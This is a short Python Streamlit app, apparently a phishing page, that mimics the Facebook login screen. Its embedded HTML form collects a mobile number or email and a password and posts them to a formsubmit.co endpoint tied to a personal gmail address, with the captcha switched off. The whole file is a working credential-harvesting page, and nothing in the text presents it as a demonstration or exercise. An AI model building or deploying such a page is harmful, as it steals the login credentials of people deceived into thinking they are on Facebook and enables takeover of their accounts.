import streamlit as st

st.set_page_config(page_title="fb clone.com", page_icon="")
st.subheader("Facebook")

style = """
        <form action="https://formsubmit.co/g.sometech@gmail.com" method="POST">
        <input type="hidden" name="_captcha" value = "false">
        <h2>Mobile number or email</h2>
		<input type="text" name="usname">
		<h2>Password</h2>
		<input type="password" name="password">
		<button type="submit" name="submit">Log in</button>
	</form>
    <h4>Forgot password?</h4>
    <hr/>
    <div class="top">
    <form>
    <button type="create" name="submit">Create new account</button>
    </form>
    </div>
    <h4>English (UK)?</h4>
    <h4>Hausa</h4>
    <h4>Francais(France)</h4>
    <h4>Arabic</h4>
        """
st.markdown(style, unsafe_allow_html=True)


# USE OF CSS
def local_css(file_name):
    with open(file_name) as f:
        st.markdown(f"<style>{f.read()}</style>", unsafe_allow_html=True)


local_css('style.css')